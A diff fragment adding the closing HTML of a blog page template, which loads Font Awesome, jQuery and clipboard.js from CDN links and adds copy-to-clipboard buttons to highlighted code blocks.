+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.2/css/all.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.bootcdn.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
